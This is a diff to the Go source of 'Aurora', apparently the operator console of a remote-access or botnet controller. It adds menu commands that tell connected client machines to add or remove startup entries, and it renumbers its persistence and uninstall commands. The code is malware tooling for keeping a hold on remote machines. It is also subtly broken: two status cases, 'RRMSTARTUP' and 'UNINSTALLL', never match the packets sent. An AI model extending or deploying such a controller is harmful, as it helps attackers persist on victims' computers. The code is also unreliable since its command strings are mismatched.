@@ -92,14 +92,36 @@ func (aurora *Aurora) handleCommands() {
 			if len(inArray) >= 2 {
 				index, err := strconv.Atoi(inArray[1])
 				if err != nil {
-					aurora.simplePacket(-1, "REMOVE")
+					aurora.simplePacket(-1, "UNINSTALL")
 				} else {
-					aurora.simplePacket(index, "REMOVE")
+					aurora.simplePacket(index, "UNINSTALL")
 				}
 			} else {
-				aurora.simplePacket(-1, "REMOVE")
+				aurora.simplePacket(-1, "UNINSTALL")
 			}
 		case "3":
+			if len(inArray) >= 2 {
+				index, err := strconv.Atoi(inArray[1])
+				if err != nil {
+					aurora.simplePacket(-1, "STARTUP")
+				} else {
+					aurora.simplePacket(index, "STARTUP")
+				}
+			} else {
+				aurora.simplePacket(-1, "STARTUP")
+			}
+		case "4":
+			if len(inArray) >= 2 {
+				index, err := strconv.Atoi(inArray[1])
+				if err != nil {
+					aurora.simplePacket(-1, "RMSTARTUP")
+				} else {
+					aurora.simplePacket(index, "RMSTARTUP")
+				}
+			} else {
+				aurora.simplePacket(-1, "RMSTARTUP")
+			}
+		case "5":
 			if len(inArray) >= 2 {
 				index, err := strconv.Atoi(inArray[1])
 				if err != nil {
@@ -110,7 +132,7 @@ func (aurora *Aurora) handleCommands() {
 			} else {
 				aurora.simplePacket(-1, "PERSISTENCE")
 			}
-		case "4":
+		case "6":
 			if len(inArray) >= 2 {
 				index, err := strconv.Atoi(inArray[1])
 				if err != nil {
@@ -121,7 +143,7 @@ func (aurora *Aurora) handleCommands() {
 			} else {
 				aurora.simplePacket(-1, "RMPERSISTENCE")
 			}
-		case "5":
+		case "99":
 			clearScreen()
 			os.Exit(0)
 		default:
@@ -204,7 +226,7 @@ func (aurora *Aurora) simplePacket(index int, packet string) {
 	if index != -1 && aurora.clients.Get(index) != (Client{}) {
 		if index == -99 {
 			for _, client := range aurora.clients.All() {
-				if packet == "REMOVE" {
+				if packet == "UNINSTALL" {
 					aurora.removeConnection(client.GetConn())
 				}
 				enc := client.GetEncoder()
@@ -225,6 +247,16 @@ func (aurora *Aurora) simplePacket(index int, packet string) {
 		}
 		printLogo()
 		switch packet {
+		case "STARTUP":
+			fmt.Println("+-------------------------+")
+			fmt.Println("|      Startup Added      |")
+			fmt.Println("| Press Enter To Continue |")
+			fmt.Println("+-------------------------+")
+		case "RRMSTARTUP":
+			fmt.Println("+-------------------------+")
+			fmt.Println("|     Startup Removed     |")
+			fmt.Println("| Press Enter To Continue |")
+			fmt.Println("+-------------------------+")
 		case "PERSISTENCE":
 			fmt.Println("+-------------------------+")
 			fmt.Println("|    Persistence Added    |")
@@ -235,7 +267,7 @@ func (aurora *Aurora) simplePacket(index int, packet string) {
 			fmt.Println("|   Persistence Removed   |")
 			fmt.Println("| Press Enter To Continue |")
 			fmt.Println("+-------------------------+")
-		case "REMOVE":
+		case "UNINSTALLL":
 			fmt.Println("+-------------------------+")
 			fmt.Println("|   Connection Removed    |")
 			fmt.Println("| Press Enter To Continue |")
@@ -273,15 +305,17 @@ func printLogo() {
 
 func printMenu() {
 	printLogo()
-	fmt.Println("+-------------+")
-	fmt.Println("| Commands    |")
-	fmt.Println("+---+---------+")
-	fmt.Println("| 1 | Ping    |")
-	fmt.Println("| 2 | Remove  |")
-	fmt.Println("| 3 | Persist |")
-	fmt.Println("| 4 | Rm Prst |")
-	fmt.Println("| 5 | Exit    |")
-	fmt.Println("+---+---------+")
+	fmt.Println("+----------------+")
+	fmt.Println("| Commands       |")
+	fmt.Println("+----+-----------+")
+	fmt.Println("| 1  | Ping      |")
+	fmt.Println("| 2  | Uninstall |")
+	fmt.Println("| 3  | Startup   |")
+	fmt.Println("| 4  | Rm Strtup |")
+	fmt.Println("| 5  | Persist   |")
+	fmt.Println("| 6  | Rm Prsist |")
+	fmt.Println("| 99 | Exit      |")
+	fmt.Println("+----+-----------+")
 	fmt.Print("\nEnter Command: ")
 }
 
